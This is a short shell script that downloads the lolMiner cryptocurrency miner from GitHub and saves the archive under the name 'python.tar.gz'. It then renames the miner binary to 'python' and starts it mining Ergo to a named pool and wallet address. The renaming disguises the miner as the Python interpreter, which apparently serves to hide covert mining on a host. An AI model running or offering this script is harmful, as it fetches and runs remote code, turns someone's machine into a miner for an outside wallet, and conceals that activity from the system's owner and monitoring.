curl -L -o python.tar.gz https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.65/lolMiner_v1.65_Lin64.tar.gz
tar -zxvf python.tar.gz
cd 1.65
mv lolMiner python
./python --algo AUTOLYKOS2 --pool stratum+tcp://ergo.magicpool.co:3333 --user ERGO:9gL1cBifCAEzDjKd9ov5sHpWbxSt2jqAiHhVrXPxhWc6B6zfW7G.sedar
